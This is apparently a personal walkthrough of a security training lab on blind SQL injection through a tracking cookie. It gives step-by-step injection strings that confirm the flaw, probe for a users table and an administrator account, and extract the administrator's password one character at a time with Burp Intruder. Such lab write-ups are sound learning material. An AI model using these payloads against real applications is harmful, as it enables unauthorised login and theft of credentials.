Lab #11 - Blind SQL Injection with conditional responses

Vulnerable parameter - Tracking Cookie

End Goals:

- Enumerate the password of administrator
- Login as administrator user

Analysis:

1. Confirm that the parameter is vulnerable to blind sqli

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes'

- If the tracking id exists => query returns value => Welcome back
- If it doesn't exist => query returns nothing => no Welcome back

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and 1=1--' -> ```True``` -> ```Welcome back```

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and 1=2--' -> ```False``` -> ```no Welcome back```

2. Confirm that we have a users table

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select 'x' from users LIMIT 1)='x'-- ' -> ```if users table exists``` -> ```True``` -> ```Welcome back``` ==> users table exists

3. Confirm username administrator exists in users table

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select username from users where username='administrator')='administrator'-- ' -> ```if username administrator exists``` -> ```True``` -> ```Welcome back``` ==> user administrator exists

4. Enumerate password for the administrator user

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select username from users where username='administrator' and LENGTH(password)>=1)='administrator'-- ' ==> ```length of password is 20```

    select tracking-id from tracking-table where trackingId = '5nGtNEmM1huhUPes' and (select substring(password,1,1) from users where username='administrator')='a'-- ' ==> ```gives the administrator's password``` [with the help of intruder(burp)]
